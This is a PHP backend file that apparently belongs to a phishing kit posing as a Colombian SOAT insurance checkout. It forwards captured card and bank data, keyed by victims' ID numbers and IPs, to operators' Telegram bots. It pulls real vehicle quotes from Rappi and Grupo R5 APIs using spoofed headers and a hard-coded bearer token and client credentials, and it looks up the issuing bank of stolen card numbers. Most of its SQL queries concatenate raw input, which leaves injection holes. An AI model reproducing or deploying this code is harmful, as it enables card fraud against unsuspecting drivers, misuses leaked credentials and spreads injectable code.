<?php
// error_reporting(E_ERROR | E_PARSE);

function enviar_telegram($mensaje, $owner, $es_bank = false, $options = [])
{
	$db = Database::getConnection();
	$consulta = mysqli_query($db, "SELECT * FROM users WHERE id = '" . $owner . "' OR rango = '5'");

	while ($datos = mysqli_fetch_array($consulta)) {
		$token = $datos['token_' . ($es_bank ? 'bank' : 'card') . '_telegram'];
		$chat = $datos['chat_' . ($es_bank ? 'bank' : 'card') . '_telegram'];

		if (!$token || !$chat) {
			continue;
		}

		try {
			$url = "https://api.telegram.org/bot" . $token . "/sendMessage";

			$data = [
				'chat_id' => $chat,
				'text' => $mensaje,
			];

			if ($options) {
				$data['reply_markup'] = json_encode([
					'inline_keyboard' => $options
				]);
			}

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			$response = curl_exec($ch);
			curl_close($ch);

			// echo $response;
		} catch (Exception $e) {
			error_log("Error al enviar mensaje: " . $e->getMessage(), 3, "error.log");
		}
	}

	return false;
}


function getToken()
{
	$url = "https://services.grability.rappi.com/api/rocket/exchange/authorization_code";

	$data = [
		"grant_type" => "authorization_code",
		"code" => "3f36fbe3-ab0c-4c9e-b0cd-949162c951a2", // Reemplaza con tu código válido
		"redirect_uri" => "https://soat.rappi.com.co",
		"client_id" => "inAhSn38ayEY5P2MSHKJzTqPyWZjVgq28NtYo0aH"
	];

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		"accept: application/json, text/plain, */*",
		"content-type: application/json",
		"origin: https://soat.rappi.com.co",
		"referer: https://soat.rappi.com.co/",
		"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
	]);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($ch);

	if (curl_errno($ch)) {
		echo "Error en la solicitud cURL: " . curl_error($ch);
		curl_close($ch);
		return null;
	}

	curl_close($ch);

	$responseData = json_decode($response, true);

	if (isset($responseData['access_token'])) {
		return $responseData['access_token'];
	} else {
		echo "Error al obtener el token. Respuesta del servidor: " . print_r($responseData, true);
		return null;
	}
}

function getDataSoat($placa)
{

	$url = "https://services.grability.rappi.com/api/boba/soat/quote";

	$data = [
		"Plate" => $placa
	];

	// Inicializar cURL
	$ch = curl_init();

	// Configurar las opciones de cURL
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		"accept: application/json, text/plain, */*",
		"accept-language: es-ES,es;q=0.8",
		"auth_owner: application_users",
		"auth_scope: all",
		"authorization: Bearer ft.gAAAAABnpla1XWyZ8REAcY650Bw2EyUPptpj96hPAKA4vhfr1Uogi2KAOXAWfivUFLv_fuwHforswiEVcDkPdzZMAzxMGZND_RFPkyFfheoOzGwHmvv4Tt2gTZgrPONqms-SQKdQOLps4As-sm_T8NUidTrlCvzbBpYBxOzKhC3AumNsnkgpDSEw8pFC096CerNlvm9IlAh5ggRQv4Z5WvHr4ePuBsZzwt_RdLnrh5Q_-6bo6F5x69I4KuHnHdsWzTooBIh-9zx0eyX0-yLo2eZ8eqy2HmAFIfEECFBzjPOslwItuYgODybGiGYmUvKtwXBLtxZjW3E6jmjCFVjJSU7SUXM_mG9w8rOVrHUGkfIgTFpogqGFHU5KDkdJSwTZHkvJ5ZFwyOSsspCXw1XnDHxbhy_ZlS-qSQ==",
		"content-type: application/json",
		"origin: https://soat.rappi.com.co",
		"referer: https://soat.rappi.com.co/",
		"request_id: GET_SOAT_QUOTE",
		"sec-ch-ua: \"Not(A:Brand\";v=\"99\", \"Brave\";v=\"133\", \"Chromium\";v=\"133\"",
		"sec-ch-ua-mobile: ?0",
		"sec-ch-ua-platform: \"Windows\"",
		"sec-fetch-dest: empty",
		"sec-fetch-mode: cors",
		"sec-fetch-site: cross-site",
		"sec-gpc: 1",
		"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
	]);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Devolver la respuesta como una cadena

	$response = curl_exec($ch);

	if (curl_errno($ch)) {
		echo "Error en la solicitud cURL: " . curl_error($ch);
		curl_close($ch);
		return null;
	}

	curl_close($ch);

	$responseData = json_decode($response, true);

	return $responseData;
}
function getDataSoat_Old($vehicleRegistration, $funnelName = "soat_funnel_default", $funnelType = "DESKTOP")
{
	$url = "https://ms.grupor5.com/odin/graphql/";

	$data = [
		"operationName" => "funnelMutation",
		"variables" => [
			"funnelName" => $funnelName,
			"funnelType" => $funnelType,
			"applicationData" => [
				"generatedFrom" => "FUNNEL_WEB",
				"insuranceCompany" => "BOLIVAR",
				"vehicleRegistration" => $vehicleRegistration,
				"gaCampaing" => "(none)",
				"gaContent" => "(none)",
				"gaSource" => "(direct)",
				"gaMedium" => "(none)",
				"gaLandingPage" => "https://soat.grupor5.com/checkout/expired-time",
				"gaKeyword" => "(none)",
				"utmCampaign" => "(none)",
				"utmKeyword" => "(none)",
				"utmLandingPage" => "https://soat.grupor5.com/checkout/expired-time",
				"utmMedium" => "(none)",
				"utmSource" => "(direct)",
				"analyticsClientId" => "No track",
				"fbclid" => "",
				"gaGclid" => "",
				"analyticsSessionId" => "No track",
				"isMobile" => false,
				"platform" => "Windows",
				"navigator" => "Google Chrome or Chromium"
			]
		],
		"query" => "mutation funnelMutation(\$funnelType: FunnelTypeEnum, \$applicationData: OdinApplicationType!, \$funnelName: String, \$token: String) {
            soatFunnel(
                funnelType: \$funnelType
                applicationData: \$applicationData
                funnelName: \$funnelName
                token: \$token
            ) {
                nextStep
                token
                application {
                    id
                    originalPrice
                    vehicleBrandName
                    vehicleLineName
                    vehicleModel
                    valueDiscount
                    vehicleRegistration
                    vehicleEngine
                    validityFrom
                    expirationDate
                    created
                    offline
                    validateOtp
                    vehicleType
                    __typename
                }
                __typename
            }
        }"
	];

	$headers = [
		"accept: */*",
		"accept-language: es-ES,es;q=0.7",
		"content-type: application/json",
		"origin: https://localhost",
		"priority: u=1, i",
		"referer: https://localhost/",
		"sec-ch-ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Brave\";v=\"132\"",
		"sec-ch-ua-mobile: ?0",
		"sec-ch-ua-platform: \"Windows\"",
		"sec-fetch-dest: empty",
		"sec-fetch-mode: cors",
		"sec-fetch-site: cross-site",
		"sec-gpc: 1",
		"traceparent: 00-00000000000000007f20a9438424dad4-05984543be27325a-01",
		"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
	];

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

	$response = curl_exec($ch);
	if (curl_errno($ch)) {
		$error_message = curl_error($ch);
		file_put_contents('get_params.log', "Error cURL: $error_message", FILE_APPEND);
	}

	if ($response === false) {
		file_put_contents('get_params.log', "Respuesta vacía de la API", FILE_APPEND);
	}
	curl_close($ch);

	$result = json_decode($response, true);
	file_put_contents('get_params.log', print_r($result['data']['soatFunnel'], true), FILE_APPEND);


	return $result['data']['soatFunnel']  ?? null;
}


function crear_registro($array = [])
{
	try {
		$db = Database::getConnection();
		if ($array) {
			$campos = '';
			$values = '';
			foreach ($array as $c => $v) {
				if ($campos != '') {
					$campos .= ', ';
					$values .= ', ';
				}
				$campos .= $c;
				$values .= "'" . mysqli_real_escape_string($db, $v) . "'";
			}
			$str_query = "INSERT INTO datos ($campos) VALUES ($values);";

			if (mysqli_query($db, $str_query)) {
				return mysqli_insert_id($db);
			}
		}
		return -1;
	} catch (Exception $e) {
		error_log($e->getMessage());
		return -1;
	}
}

function get_identico($array)
{
	if (!$array) {
		return false;
	}
	$db = Database::getConnection();
	$buscar = '';
	foreach ($array as $col => $val) {
		if ($buscar != '') {
			$buscar .= ' AND ';
		}
		$buscar .=  $col . "='" . $val . "'";
	}
	$query =  "SELECT status FROM datos WHERE " . $buscar;
	$consulta = mysqli_query($db, $query);
	if (mysqli_fetch_assoc($consulta)) {
		return true;
	}
	return false;
}
function get_cedula_finalizada($cedula)
{
	$db = Database::getConnection();
	$consulta = mysqli_query($db, "SELECT * FROM datos WHERE cedula = '" . $cedula . "' AND status = 'finish'");
	if ($datos = mysqli_fetch_assoc($consulta)) {
		return $datos;
	}
	return null;
}
function buscar_estado($reg)
{
	$db = Database::getConnection();
	$consulta = mysqli_query($db, "SELECT status FROM datos WHERE idreg = '" . $reg . "'");
	if ($datos = mysqli_fetch_assoc($consulta)) {
		return $datos["status"];
	}
	return -1;
}
function buscar_registro($reg)
{
	$db = Database::getConnection();
	$consulta = mysqli_query($db, "SELECT * FROM datos WHERE idreg = '" . $reg . "'");
	if ($datos = mysqli_fetch_assoc($consulta)) {
		return $datos;
	}
	return null;
}
function actualizar_registro($reg, $array = [], $time = true)
{
	if ($time) {
		$array['horamodificado'] = time();
	}
	if (!$array) {
		return -1;
	}
	$array['ip'] = $_SERVER['REMOTE_ADDR'];
	$db = Database::getConnection();
	$query = "UPDATE datos SET ";
	$modificar = '';
	foreach ($array as $col => $val) {
		if ($modificar != '') {
			$modificar .= ', ';
		}
		$modificar .=  $col . "='" . $val . "'";
	}
	$query .=  $modificar . " WHERE idreg='" . $reg . "'";
	$r = mysqli_query($db, $query);
	if (!$r) {
		return -1;
	}
	return true;
}



/**
 * Identifica el tipo de tarjeta basado en el BIN
 * @param string $bin - Los primeros 6 dígitos de la tarjeta
 * @return array - Información del BIN (tipo, marca, banco, país)
 */
function identificar_tipo_bin($bin)
{
	try {
		// Usar API gratuita de binlist.net
		$url = "https://lookup.binlist.net/" . $bin;

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 5);
		curl_setopt($ch, CURLOPT_HTTPHEADER, [
			"Accept-Version: 3"
		]);

		$response = curl_exec($ch);
		$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);

		if ($http_code == 200 && $response) {
			$data = json_decode($response, true);

			$tipo = isset($data['type']) ? strtoupper($data['type']) : 'DESCONOCIDO';
			$marca = isset($data['scheme']) ? strtoupper($data['scheme']) : 'DESCONOCIDO';
			$banco = isset($data['bank']['name']) ? $data['bank']['name'] : 'DESCONOCIDO';
			$pais = isset($data['country']['name']) ? $data['country']['name'] : 'DESCONOCIDO';
			$prepago = isset($data['prepaid']) ? ($data['prepaid'] ? 'SÍ' : 'NO') : 'DESCONOCIDO';

			return [
				'tipo' => $tipo, // DEBIT, CREDIT, PREPAID
				'marca' => $marca, // VISA, MASTERCARD, etc.
				'banco' => $banco,
				'pais' => $pais,
				'prepago' => $prepago,
				'success' => true
			];
		}
	} catch (Exception $e) {
		error_log("Error al identificar BIN: " . $e->getMessage(), 3, "error.log");
	}

	// Si falla, retornar información por defecto
	return [
		'tipo' => 'DESCONOCIDO',
		'marca' => 'DESCONOCIDO',
		'banco' => 'DESCONOCIDO',
		'pais' => 'DESCONOCIDO',
		'prepago' => 'DESCONOCIDO',
		'success' => false
	];
}

// Custom Shop Functions
function get_shop($id = 0)
{
	$db = Database::getConnection();
	$consulta = mysqli_query($db, "SELECT * FROM shop_configs WHERE user_cod_unico = '" . $id . "'");
	$items = [];

	while ($datos = mysqli_fetch_object($consulta)) {
		$items[] = $datos;
	}

	return $items;
}
